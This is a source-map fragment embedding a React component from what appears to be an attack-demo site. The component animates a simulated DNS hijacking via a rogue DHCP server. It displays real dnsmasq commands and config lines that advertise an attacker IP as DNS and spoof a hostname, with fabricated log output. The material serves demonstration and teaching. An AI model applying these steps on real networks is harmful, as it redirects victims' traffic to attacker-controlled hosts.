\"Terminal\");\n$RefreshReg$(_c16, \"TerminalHeader\");\n$RefreshReg$(_c17, \"TerminalDot\");\n$RefreshReg$(_c18, \"TerminalTitle\");\n$RefreshReg$(_c19, \"CommandLine\");\n$RefreshReg$(_c20, \"OutputLine\");\n$RefreshReg$(_c21, \"ControlPanel\");\n$RefreshReg$(_c22, \"ControlButton\");\n$RefreshReg$(_c23, \"StatusIndicator\");\n$RefreshReg$(_c24, \"StatusDot\");\n$RefreshReg$(_c25, \"InfoPanel\");\n$RefreshReg$(_c26, \"InfoTitle\");\n$RefreshReg$(_c27, \"InfoText\");\n$RefreshReg$(_c28, \"DNSHijackDemo\");","map":{"version":3,"names":["React","useState","useEffect","useRef","styled","motion","AnimatePresence","jsxDEV","_jsxDEV","DemoSection","section","_c","SectionTitle","h2","_c2","SectionSubtitle","p","props","theme","colors","textSecondary","_c3","DemoGrid","div","_c4","DemoContainer","surface","borderRadius","lg","border","_c5","DemoHeader","_c6","DemoTitle","h3","text","_c7","DNSTopology","md","_c8","DHCPContainer","_c9","DHCPFlow","_c0","NetworkNode","nodeType","_c1","NodeLabel","_c10","NodeIP","_c11","FlowArrow","isActive","_c12","StepIndicator","_c13","Step","active","_c14","Terminal","_c15","TerminalHeader","_c16","TerminalDot","color","_c17","TerminalTitle","span","_c18","CommandLine","_c19","OutputLine","type","_c20","ControlPanel","_c21","ControlButton","button","variant","surfaceLight","_c22","StatusIndicator","status","_c23","StatusDot","_c24","InfoPanel","_c25","InfoTitle","h4","_c26","InfoText","_c27","dhcpPoisoningSteps","command","description","dnsConfigSteps","attackExecutionSteps","DNSHijackDemo","_s","currentPhase","setCurrentPhase","currentStep","setCurrentStep","terminalOutput","setTerminalOutput","isAttackActive","setIsAttackActive","dhcpFlowActive","setDhcpFlowActive","terminalRef","scrollToBottom","current","scrollTop","scrollHeight","addTerminalLine","content","outputType","prev","simulateDHCPSetup","step","Promise","resolve","setTimeout","includes","simulateDNSConfig","simulateAttackExecution","resetDemo","startFullAttack","getStatusText","id","children","fileName","_jsxFileName","lineNumber","columnNumber","animate","scale","borderColor","transition","duration","repeat","Infinity","className","opacity","map","onClick","disabled","ref","line","index","initial","y","style","marginTop","_c28","$RefreshReg$"],"sources":["/Users/eddy/AdvCUA_page/attack-demo/src/components/DNSHijackDemo.tsx"],"sourcesContent":["import React, { useState, useEffect, useRef } from 'react';\nimport styled from 'styled-components';\nimport { motion, AnimatePresence } from 'framer-motion';\n\nconst DemoSection = styled.section`\n  padding: 4rem 2rem;\n  max-width: 1400px;\n  margin: 0 auto;\n  min-height: 100vh;\n`;\n\nconst SectionTitle = styled.h2`\n  font-size: 2.5rem;\n  font-weight: 700;\n  text-align: center;\n  margin-bottom: 1rem;\n  background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 50%, #06b6d4 100%);\n  -webkit-background-clip: text;\n  -webkit-text-fill-color: transparent;\n  background-clip: text;\n`;\n\nconst SectionSubtitle = styled.p`\n  text-align: center;\n  color: ${props => props.theme.colors.textSecondary};\n  font-size: 1.125rem;\n  margin-bottom: 3rem;\n`;\n\nconst DemoGrid = styled.div`\n  display: grid;\n  grid-template-columns: 1fr 1fr;\n  gap: 2rem;\n  \n  @media (max-width: 1200px) {\n    grid-template-columns: 1fr;\n  }\n`;\n\nconst DemoContainer = styled.div`\n  background-color: ${props => props.theme.colors.surface};\n  border-radius: ${props => props.theme.borderRadius.lg};\n  padding: 2rem;\n  border: 1px solid ${props => props.theme.colors.border};\n  position: relative;\n  overflow: hidden;\n`;\n\nconst DemoHeader = styled.div`\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 2rem;\n  padding-bottom: 1rem;\n  border-bottom: 1px solid ${props => props.theme.colors.border};\n`;\n\nconst DemoTitle = styled.h3`\n  font-size: 1.25rem;\n  font-weight: 600;\n  color: ${props => props.theme.colors.text};\n`;\n\nconst DNSTopology = styled.div`\n  padding: 2rem;\n  text-align: center;\n  background: linear-gradient(135deg, rgba(139, 92, 246, 0.05) 0%, rgba(236, 72, 153, 0.05) 100%);\n  border-radius: ${props => props.theme.borderRadius.md};\n  margin-bottom: 2rem;\n`;\n\nconst DHCPContainer = styled.div`\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  gap: 2rem;\n  margin: 2rem 0;\n`;\n\nconst DHCPFlow = styled.div`\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  width: 100%;\n  position: relative;\n`;\n\nconst NetworkNode = styled(motion.div)<{ nodeType: 'client' | 'dhcp' | 'dns' }>`\n  width: 100px;\n  height: 100px;\n  border-radius: 12px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  color: white;\n  font-weight: 600;\n  font-size: 0.75rem;\n  position: relative;\n  border: 3px solid;\n  \n  ${props => {\n    switch (props.nodeType) {\n      case 'client':\n        return `\n          background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);\n          border-color: #06b6d4;\n        `;\n      case 'dhcp':\n        return `\n          background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);\n          border-color: #8b5cf6;\n        `;\n      case 'dns':\n        return `\n          background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);\n          border-color: #ec4899;\n        `;\n    }\n  }}\n`;\n\nconst NodeLabel = styled.div`\n  font-size: 0.7rem;\n  margin-top: 0.5rem;\n`;\n\nconst NodeIP = styled.div`\n  font-size: 0.6rem;\n  opacity: 0.9;\n`;\n\nconst FlowArrow = styled(motion.div)<{ isActive: boolean }>`\n  position: absolute;\n  top: 50%;\n  transform: translateY(-50%);\n  height: 3px;\n  background: ${props => props.isActive ? \n    'linear-gradient(90deg, #8b5cf6 0%, #ec4899 50%, #06b6d4 100%)' : \n    '#374151'};\n  border-radius: 2px;\n  \n  &::after {\n    content: '';\n    position: absolute;\n    right: -8px;\n    top: -5px;\n    width: 0;\n    height: 0;\n    border-left: 8px solid ${props => props.isActive ? '#06b6d4' : '#374151'};\n    border-top: 5px solid transparent;\n    border-bottom: 5px solid transparent;\n  }\n  \n  &.arrow-1 {\n    left: 120px;\n    width: 80px;\n  }\n  \n  &.arrow-2 {\n    right: 120px;\n    width: 80px;\n  }\n`;\n\nconst StepIndicator = styled.div`\n  display: flex;\n  justify-content: center;\n  gap: 1rem;\n  margin: 1rem 0;\n`;\n\nconst Step = styled(motion.div)<{ active: boolean }>`\n  width: 12px;\n  height: 12px;\n  border-radius: 50%;\n  background-color: ${props => props.active ? '#8b5cf6' : '#374151'};\n  transition: all 0.3s ease;\n`;\n\nconst Terminal = styled.div`\n  background-color: #1e1e1e;\n  border-radius: ${props => props.theme.borderRadius.md};\n  padding: 1.5rem;\n  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;\n  font-size: 0.8rem;\n  height: 400px;\n  overflow-y: auto;\n  position: relative;\n`;\n\nconst TerminalHeader = styled.div`\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  margin-bottom: 1rem;\n  padding-bottom: 0.5rem;\n  border-bottom: 1px solid #374151;\n`;\n\nconst TerminalDot = styled.div<{ color: string }>`\n  width: 12px;\n  height: 12px;\n  border-radius: 50%;\n  background-color: ${props => props.color};\n`;\n\nconst TerminalTitle = styled.span`\n  color: #9ca3af;\n  font-size: 0.75rem;\n`;\n\nconst CommandLine = styled(motion.div)`\n  color: #10b981;\n  margin: 0.5rem 0;\n  \n  &::before {\n    content: \"$ \";\n    color: #8b5cf6;\n  }\n`;\n\nconst OutputLine = styled(motion.div)<{ type?: 'success' | 'error' | 'warning' | 'info' }>`\n  color: ${props => {\n    switch (props.type) {\n      case 'success': return '#10b981';\n      case 'error': return '#ef4444';\n      case 'warning': return '#f59e0b';\n      case 'info': return '#06b6d4';\n      default: return '#d1d5db';\n    }\n  }};\n  margin: 0.25rem 0;\n  font-size: 0.75rem;\n`;\n\nconst ControlPanel = styled.div`\n  display: flex;\n  gap: 1rem;\n  margin-bottom: 2rem;\n  flex-wrap: wrap;\n`;\n\nconst ControlButton = styled.button<{ variant?: 'primary' | 'danger' | 'success' | 'warning' }>`\n  padding: 0.5rem 1rem;\n  border-radius: ${props => props.theme.borderRadius.md};\n  border: none;\n  font-weight: 600;\n  font-size: 0.875rem;\n  cursor: pointer;\n  transition: all 0.2s ease;\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  \n  ${props => {\n    switch (props.variant) {\n      case 'primary':\n        return `\n          background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3); }\n        `;\n      case 'danger':\n        return `\n          background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3); }\n        `;\n      case 'success':\n        return `\n          background: linear-gradient(135deg, #10b981 0%, #059669 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }\n        `;\n      case 'warning':\n        return `\n          background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3); }\n        `;\n      default:\n        return `\n          background-color: ${props.theme.colors.surface};\n          color: ${props.theme.colors.text};\n          border: 1px solid ${props.theme.colors.border};\n          &:hover { background-color: ${props.theme.colors.surfaceLight}; }\n        `;\n    }\n  }}\n  \n  &:disabled {\n    opacity: 0.5;\n    cursor: not-allowed;\n  }\n`;\n\nconst StatusIndicator = styled.div<{ status: 'idle' | 'dhcp' | 'dns' | 'spoofing' | 'monitoring' }>`\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  padding: 0.5rem 1rem;\n  border-radius: ${props => props.theme.borderRadius.md};\n  font-size: 0.875rem;\n  font-weight: 600;\n  \n  ${props => {\n    switch (props.status) {\n      case 'idle':\n        return `\n          background-color: rgba(107, 114, 128, 0.1);\n          color: #6b7280;\n        `;\n      case 'dhcp':\n        return `\n          background-color: rgba(139, 92, 246, 0.1);\n          color: #8b5cf6;\n        `;\n      case 'dns':\n        return `\n          background-color: rgba(236, 72, 153, 0.1);\n          color: #ec4899;\n        `;\n      case 'spoofing':\n        return `\n          background-color: rgba(239, 68, 68, 0.1);\n          color: #ef4444;\n        `;\n      case 'monitoring':\n        return `\n          background-color: rgba(16, 185, 129, 0.1);\n          color: #10b981;\n        `;\n    }\n  }}\n`;\n\nconst StatusDot = styled.div<{ isActive: boolean }>`\n  width: 8px;\n  height: 8px;\n  border-radius: 50%;\n  background-color: currentColor;\n  animation: ${props => props.isActive ? 'pulse 2s infinite' : 'none'};\n  \n  @keyframes pulse {\n    0% { opacity: 1; }\n    50% { opacity: 0.5; }\n    100% { opacity: 1; }\n  }\n`;\n\nconst InfoPanel = styled.div`\n  background: linear-gradient(135deg, rgba(139, 92, 246, 0.05) 0%, rgba(236, 72, 153, 0.05) 100%);\n  border-radius: ${props => props.theme.borderRadius.md};\n  padding: 1rem;\n  margin-bottom: 1rem;\n`;\n\nconst InfoTitle = styled.h4`\n  color: ${props => props.theme.colors.text};\n  font-size: 1rem;\n  font-weight: 600;\n  margin-bottom: 0.5rem;\n`;\n\nconst InfoText = styled.p`\n  color: ${props => props.theme.colors.textSecondary};\n  font-size: 0.875rem;\n  line-height: 1.5;\n`;\n\n// Attack simulation data\nconst dhcpPoisoningSteps = [\n  { command: \"apt-get update && apt-get install -y dnsmasq\", description: \"Installing dnsmasq for DHCP/DNS services\" },\n  { command: \"systemctl stop systemd-resolved\", description: \"Stopping system DNS resolver\" },\n  { command: \"cat > /etc/dnsmasq.conf\", description: \"Configuring DHCP server\" }\n];\n\nconst dnsConfigSteps = [\n  { command: \"echo 'dhcp-range=192.168.2.50,192.168.2.150,12h' >> /etc/dnsmasq.conf\", description: \"Setting DHCP range\" },\n  { command: \"echo 'dhcp-option=6,192.168.2.101' >> /etc/dnsmasq.conf\", description: \"Setting DNS server option\" },\n  { command: \"echo 'address=/target-server/192.168.2.150' >> /etc/dnsmasq.conf\", description: \"Adding DNS spoofing entry\" }\n];\n\nconst attackExecutionSteps = [\n  { command: \"systemctl restart dnsmasq\", description: \"Starting malicious DHCP/DNS server\" },\n  { command: \"systemctl status dnsmasq\", description: \"Verifying service status\" },\n  { command: \"tail -f /var/log/dnsmasq.log\", description: \"Monitoring DNS queries\" }\n];\n\nexport const DNSHijackDemo: React.FC = () => {\n  const [currentPhase, setCurrentPhase] = useState<'idle' | 'dhcp' | 'dns' | 'spoofing' | 'monitoring'>('idle');\n  const [currentStep, setCurrentStep] = useState(0);\n  const [terminalOutput, setTerminalOutput] = useState<Array<{ type: 'command' | 'output', content: string, outputType?: 'success' | 'error' | 'warning' | 'info' }>>([]);\n  const [isAttackActive, setIsAttackActive] = useState(false);\n  const [dhcpFlowActive, setDhcpFlowActive] = useState(false);\n  const terminalRef = useRef<HTMLDivElement>(null);\n\n  const scrollToBottom = () => {\n    if (terminalRef.current) {\n      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;\n    }\n  };\n\n  useEffect(() => {\n    scrollToBottom();\n  }, [terminalOutput]);\n\n  const addTerminalLine = (type: 'command' | 'output', content: string, outputType?: 'success' | 'error' | 'warning' | 'info') => {\n    setTerminalOutput(prev => [...prev, { type, content, outputType }]);\n  };\n\n  const simulateDHCPSetup = async () => {\n    setCurrentPhase('dhcp');\n    setCurrentStep(1);\n    addTerminalLine('output', '=== Setting up Malicious DHCP Server ===', 'info');\n    \n    for (const step of dhcpPoisoningSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1500));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 800));\n      \n      if (step.command.includes('apt-get')) {\n        addTerminalLine('output', 'Reading package lists... Done', 'info');\n        addTerminalLine('output', 'Building dependency tree... Done', 'info');\n        addTerminalLine('output', 'dnsmasq is already the newest version (2.90-0ubuntu0.22.04.1).', 'success');\n        addTerminalLine('output', '0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.', 'success');\n      } else if (step.command.includes('systemctl stop')) {\n        addTerminalLine('output', 'Stopped system DNS resolver', 'warning');\n      } else if (step.command.includes('cat >')) {\n        addTerminalLine('output', 'Creating dnsmasq configuration...', 'info');\n      }\n    }\n    \n    addTerminalLine('output', '✅ DHCP server configuration ready', 'success');\n  };\n\n  const simulateDNSConfig = async () => {\n    setCurrentPhase('dns');\n    setCurrentStep(2);\n    addTerminalLine('output', '=== Configuring DNS Spoofing ===', 'info');\n    \n    for (const step of dnsConfigSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1200));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 600));\n      \n      if (step.command.includes('dhcp-range')) {\n        addTerminalLine('output', 'DHCP range: 192.168.2.50 - 192.168.2.150', 'info');\n      } else if (step.command.includes('dhcp-option')) {\n        addTerminalLine('output', 'DNS server set to: 192.168.2.101 (attacker)', 'warning');\n      } else if (step.command.includes('address=')) {\n        addTerminalLine('output', 'DNS spoofing: target-server → 192.168.2.150', 'warning');\n      }\n    }\n    \n    addTerminalLine('output', '🎯 DNS spoofing configuration complete', 'warning');\n  };\n\n  const simulateAttackExecution = async () => {\n    setCurrentPhase('spoofing');\n    setCurrentStep(3);\n    setDhcpFlowActive(true);\n    addTerminalLine('output', '=== Launching Attack ===', 'info');\n    \n    for (const step of attackExecutionSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1500));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 800));\n      \n      if (step.command.includes('restart dnsmasq')) {\n        addTerminalLine('output', 'Starting DNS forwarder and DHCP server dnsmasq', 'success');\n        addTerminalLine('output', '[ OK ]', 'success');\n        setIsAttackActive(true);\n      } else if (step.command.includes('status dnsmasq')) {\n        addTerminalLine('output', '● dnsmasq.service - dnsmasq - A lightweight DHCP and caching DNS server', 'info');\n        addTerminalLine('output', '   Loaded: loaded (/lib/systemd/system/dnsmasq.service; enabled)', 'info');\n        addTerminalLine('output', '   Active: active (running) since Wed 2025-09-18 01:04:23 UTC', 'success');\n      } else if (step.command.includes('tail -f')) {\n        addTerminalLine('output', 'Sep 18 01:04:24 dnsmasq[1234]: started, version 2.90', 'info');\n        addTerminalLine('output', 'Sep 18 01:04:24 dnsmasq[1234]: DHCP, IP range 192.168.2.50 -- 192.168.2.150', 'info');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPDISCOVER(eth0) 192.168.2.100', 'warning');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPOFFER(eth0) 192.168.2.100 02:42:c0:a8:02:64', 'warning');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPACK(eth0) 192.168.2.100 02:42:c0:a8:02:64', 'warning');\n        setCurrentPhase('monitoring');\n      }\n    }\n    \n    addTerminalLine('output', '🔥 DNS hijacking attack is now active!', 'error');\n    \n    // Simulate DNS queries\n    setTimeout(() => {\n      addTerminalLine('output', 'Sep 18 01:04:30 dnsmasq[1234]: query[A] target-server from 192.168.2.100', 'warning');\n      addTerminalLine('output', 'Sep 18 01:04:30 dnsmasq[1234]: config target-server is 192.168.2.150', 'error');\n      addTerminalLine('output', '🎯 DNS query intercepted and spoofed!', 'error');\n    }, 3000);\n  };\n\n  const resetDemo = () => {\n    setCurrentPhase('idle');\n    setCurrentStep(0);\n    setTerminalOutput([]);\n    setIsAttackActive(false);\n    setDhcpFlowActive(false);\n  };\n\n  const startFullAttack = async () => {\n    resetDemo();\n    await simulateDHCPSetup();\n    await simulateDNSConfig();\n    await simulateAttackExecution();\n  };\n\n  const getStatusText = () => {\n    switch (currentPhase) {\n      case 'dhcp': return 'DHCP Setup';\n      case 'dns': return 'DNS Config';\n      case 'spoofing': return 'Attack Active';\n      case 'monitoring': return 'Monitoring';\n      default: return 'Ready';\n    }\n  };\n\n  return (\n    <DemoSection id=\"dns-hijack\">\n      <SectionTitle>DNS Hijacking Attack Demo</SectionTitle>\n      <SectionSubtitle>\n        Demonstration of DHCP poisoning and DNS spoofing to redirect domain resolution\n      </SectionSubtitle>\n\n      <DemoGrid>\n        {/* DHCP/DNS Flow Visualization */}\n        <DemoContainer>\n          <DemoHeader>\n            <DemoTitle>DHCP/DNS Attack Flow</DemoTitle>\n            <StatusIndicator status={currentPhase}>\n              <StatusDot isActive={currentPhase !== 'idle'} />\n              {getStatusText()}\n            </StatusIndicator>\n          </DemoHeader>\n\n          <InfoPanel>\n            <InfoTitle>Attack Vector</InfoTitle>\n            <InfoText>\n              The attacker sets up a malicious DHCP server that provides its own IP (192.168.2.101) as the DNS server. \n              When the target host (192.168.2.100) requests DHCP configuration, it receives the attacker's DNS server, \n              allowing DNS queries to be intercepted and spoofed.\n            </InfoText>\n          </InfoPanel>\n\n          <DNSTopology>\n            <DHCPContainer>\n              <DHCPFlow>\n                <NetworkNode \n                  nodeType=\"client\"\n                  animate={{ \n                    scale: currentPhase === 'dhcp' ? [1, 1.1, 1] : 1,\n                    borderColor: currentPhase === 'dhcp' ? ['#06b6d4', '#0891b2', '#06b6d4'] : '#06b6d4'\n                  }}\n                  transition={{ duration: 2, repeat: currentPhase === 'dhcp' ? Infinity : 0 }}\n                >\n                  <div>Client</div>\n                  <NodeLabel>Target Host</NodeLabel>\n                  <NodeIP>192.168.2.100</NodeIP>\n                </NetworkNode>\n\n                <FlowArrow \n                  className=\"arrow-1\" \n                  isActive={dhcpFlowActive}\n                  animate={{ \n                    opacity: dhcpFlowActive ? [0.5, 1, 0.5] : 0.3 \n                  }}\n                  transition={{ duration: 1.5, repeat: dhcpFlowActive ? Infinity : 0 }}\n                />\n\n                <NetworkNode \n                  nodeType=\"dhcp\"\n                  animate={{ \n                    scale: currentPhase === 'dns' ? [1, 1.2, 1] : 1,\n                    borderColor: currentPhase === 'dns' ? ['#8b5cf6', '#7c3aed', '#8b5cf6'] : '#8b5cf6'\n                  }}\n                  transition={{ duration: 1.5, repeat: currentPhase === 'dns' ? Infinity : 0 }}\n                >\n                  <div>Attacker</div>\n                  <NodeLabel>DHCP/DNS</NodeLabel>\n                  <NodeIP>192.168.2.101</NodeIP>\n                </NetworkNode>\n\n                <FlowArrow \n                  className=\"arrow-2\" \n                  isActive={isAttackActive}\n                  animate={{ \n                    opacity: isAttackActive ? [0.5, 1, 0.5] : 0.3 \n                  }}\n                  transition={{ duration: 1.5, repeat: isAttackActive ? Infinity : 0 }}\n                />\n\n                <NetworkNode \n                  nodeType=\"dns\"\n                  animate={{ \n                    scale: currentPhase === 'monitoring' ? [1, 1.1, 1] : 1,\n                    borderColor: currentPhase === 'monitoring' ? ['#ec4899', '#db2777', '#ec4899'] : '#ec4899'\n                  }}\n                  transition={{ duration: 2, repeat: currentPhase === 'monitoring' ? Infinity : 0 }}\n                >\n                  <div>Spoofed</div>\n                  <NodeLabel>target-server</NodeLabel>\n                  <NodeIP>192.168.2.150</NodeIP>\n                </NetworkNode>\n              </DHCPFlow>\n\n              <StepIndicator>\n                {[1, 2, 3].map((step) => (\n                  <Step \n                    key={step}\n                    active={currentStep >= step}\n                    animate={{ \n                      scale: currentStep === step ? [1, 1.2, 1] : 1 \n                    }}\n                    transition={{ duration: 1, repeat: currentStep === step ? Infinity : 0 }}\n                  />\n                ))}\n              </StepIndicator>\n            </DHCPContainer>\n          </DNSTopology>\n\n          <ControlPanel>\n            <ControlButton variant=\"primary\" onClick={startFullAttack} disabled={currentPhase !== 'idle'}>\n              🚀 Start Attack\n            </ControlButton>\n            <ControlButton variant=\"warning\" onClick={simulateDHCPSetup} disabled={currentPhase !== 'idle'}>\n              🔧 Setup DHCP\n            </ControlButton>\n            <ControlButton variant=\"danger\" onClick={simulateDNSConfig} disabled={currentPhase !== 'idle'}>\n              🎯 Config DNS\n            </ControlButton>\n            <ControlButton variant=\"success\" onClick={simulateAttackExecution} disabled={currentPhase !== 'idle'}>\n              ⚡ Execute\n            </ControlButton>\n            <ControlButton onClick={resetDemo}>\n              🔄 Reset\n            </ControlButton>\n          </ControlPanel>\n        </DemoContainer>\n\n        {/* Terminal Output */}\n        <DemoContainer>\n          <DemoHeader>\n            <DemoTitle>Attack Terminal</DemoTitle>\n          </DemoHeader>\n\n          <Terminal ref={terminalRef}>\n            <TerminalHeader>\n              <TerminalDot color=\"#ef4444\" />\n              <TerminalDot color=\"#f59e0b\" />\n              <TerminalDot color=\"#10b981\" />\n              <TerminalTitle>root@attacker-dns:/etc</TerminalTitle>\n            </TerminalHeader>\n\n            <AnimatePresence>\n              {terminalOutput.map((line, index) => (\n                <motion.div\n                  key={index}\n                  initial={{ opacity: 0, y: 10 }}\n                  animate={{ opacity: 1, y: 0 }}\n                  transition={{ duration: 0.3 }}\n                >\n                  {line.type === 'command' ? (\n                    <CommandLine>{line.content}</CommandLine>\n                  ) : (\n                    <OutputLine type={line.outputType}>{line.content}</OutputLine>\n                  )}\n                </motion.div>\n              ))}\n            </AnimatePresence>\n\n            {currentPhase !== 'idle' && (\n              <motion.div\n                animate={{ opacity: [1, 0.5, 1] }}\n                transition={{ duration: 1, repeat: Infinity }}\n                style={{ color: '#8b5cf6', marginTop: '1rem' }}\n              >\n                ▋\n              </motion.div>\n            )}\n          </Terminal>\n        </DemoContainer>\n      </DemoGrid>\n    </DemoSection>\n  );\n};\n"],"mappings":"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